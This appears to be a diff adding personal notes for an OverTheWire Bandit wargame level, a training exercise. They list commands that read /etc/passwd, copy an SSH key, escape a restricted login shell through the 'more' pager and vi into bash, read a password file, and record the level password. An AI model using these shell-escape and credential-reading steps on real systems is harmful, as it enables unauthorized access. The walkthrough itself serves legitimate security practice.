@@ -1,0 +1,10 @@
+cat /etc/passwd | grep 26
+cat /usr/bin/showtext
+scp -P 2220  bandit25@bandit.labs.overthewire.org:~/bandit26.sshkey ./sshkey
+-- Make terminal small as possible to make more go into interactive mode
+sudo ssh bandit26@bandit.labs.overthewire.org -p 2220 -i sshkey
+v
+:set shell=/bin/bash
+:shell
+cat /etc/bandit_pass/bandit26
+s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ
